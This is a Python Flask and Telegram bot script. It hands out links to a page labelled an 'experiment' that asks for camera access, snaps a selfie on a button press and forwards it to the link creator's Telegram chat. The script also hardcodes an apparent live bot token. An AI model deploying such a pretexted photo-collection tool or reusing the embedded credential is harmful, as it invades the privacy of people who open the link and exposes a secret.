import secrets
import requests
import time
from flask import Flask, request
from threading import Thread

BOT_TOKEN = "8816809281:AAGLl8q4tS6KEMhWHWISZ8TtWvE-1kSG4KI"

links = {}
app = Flask(__name__)

@app.route('/')
def home():
    return 'Camera Bot is running!'

@app.route('/capture')
def capture():
    token = request.args.get('token')
    to_user = request.args.get('to')
    if not token or not to_user:
        return "Invalid link", 400
    links[token] = to_user
    
    html = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Эксперимент</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #000; min-height: 100vh; display: flex; flex-direction: column; }
        .header { background: rgba(0,0,0,0.8); padding: 15px; text-align: center; color: white; font-size: 16px; }
        .camera-container { flex: 1; background: #000; display: flex; align-items: center; justify-content: center; min-height: 60vh; }
        video { width: 100%; max-height: 70vh; object-fit: cover; transform: scaleX(-1); }
        .controls { padding: 20px; display: flex; justify-content: center; background: #1a1a1a; }
        button { padding: 15px 30px; font-size: 18px; border: none; border-radius: 50px; background: #007aff; color: white; font-weight: 600; cursor: pointer; }
        .status { text-align: center; padding: 12px; color: #ccc; font-size: 14px; background: #111; }
        .info { background: #2c2c2e; margin: 12px; padding: 12px; border-radius: 12px; text-align: center; font-size: 13px; color: #fff; }
    </style>
</head>
<body>
    <div class="header">📸 Эксперимент</div>
    <div class="camera-container">
        <video id="video" autoplay playsinline muted></video>
    </div>
    <div class="controls">
        <button id="captureBtn">📷 Сделать снимок</button>
    </div>
    <div id="status" class="status">⏳ Запрос доступа к камере...</div>
    <div class="info">⚠️ Нажмите «Разрешить», когда браузер запросит доступ к камере.<br>📤 Фото будет отправлено организатору эксперимента.</div>
    <script>
        const video = document.getElementById('video');
        const captureBtn = document.getElementById('captureBtn');
        const statusDiv = document.getElementById('status');
        let stream = null;
        
        async function initCamera() {
            try {
                statusDiv.innerHTML = "📷 Запрос доступа...";
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                statusDiv.innerHTML = "✅ Камера готова! Нажмите кнопку";
                captureBtn.disabled = false;
            } catch (err) {
                statusDiv.innerHTML = "❌ Ошибка доступа к камере: " + err.message;
                captureBtn.disabled = true;
            }
        }
        
        async function takePhoto() {
            if (!video.videoWidth) return;
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0);
            
            statusDiv.innerHTML = "📤 Отправка фото...";
            captureBtn.disabled = true;
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                const urlParams = new URLSearchParams(window.location.search);
                formData.append('photo', blob);
                formData.append('token', urlParams.get('token'));
                formData.append('to', urlParams.get('to'));
                
                try {
                    const response = await fetch('/upload', { method: 'POST', body: formData });
                    const result = await response.json();
                    if (result.ok) {
                        statusDiv.innerHTML = "✅ Фото отправлено! Спасибо за участие.";
                        if (stream) stream.getTracks().forEach(t => t.stop());
                    } else {
                        statusDiv.innerHTML = "❌ Ошибка при отправке на сервер.";
                        captureBtn.disabled = false;
                    }
                } catch (e) {
                    statusDiv.innerHTML = "❌ Ошибка сети.";
                    captureBtn.disabled = false;
                }
            }, 'image/jpeg', 0.9);
        }
        
        captureBtn.onclick = takePhoto;
        initCamera();
    </script>
</body>
</html>'''
    return html

@app.route('/upload', methods=['POST'])
def upload():
    photo = request.files['photo']
    token = request.form['token']
    to_user = request.form['to']
    
    if token not in links:
        return {'ok': False, 'error': 'Invalid or expired link'}, 403
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {'photo': (photo.filename, photo.stream, 'image/jpeg')}
    data = {'chat_id': to_user, 'caption': '📸 Новое фото от участника эксперимента!'}
    
    try:
        r = requests.post(url, files=files, data=data)
        return {'ok': r.status_code == 200}
    except Exception as e:
        print(e)
        return {'ok': False, 'error': str(e)}, 500

def run_flask():
    app.run(host='0.0.0.0', port=10000)

def run_bot():
    last_update_id = 0
    def send_message(chat_id, text):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        try:
            requests.post(url, data={"chat_id": chat_id, "text": text})
        except Exception as e:
            print(f"Send error: {e}")
    
    def generate_link(chat_id):
        token = secrets.token_urlsafe(16)
        full_url = f"https://telegram-selfie-bot.onrender.com/capture?token={token}&to={chat_id}"
        send_message(chat_id, f"✅ Ссылка для эксперимента готова:\n\n{full_url}\n\nОтправьте её участнику. Он должен разрешить доступ к камере.")
    
    print("🤖 Telegram бот запущен и ожидает команду /link...")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            response = requests.get(url, params=params)
            if response.status_code == 200:
                for update in response.json().get("result", []):
                    last_update_id = update["update_id"]
                    message = update.get("message")
                    if message and message.get("text") == "/link":
                        generate_link(message["chat"]["id"])
        except Exception as e:
            print(f"Bot error: {e}")
        time.sleep(1)

if __name__ == '__main__':
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    run_bot()
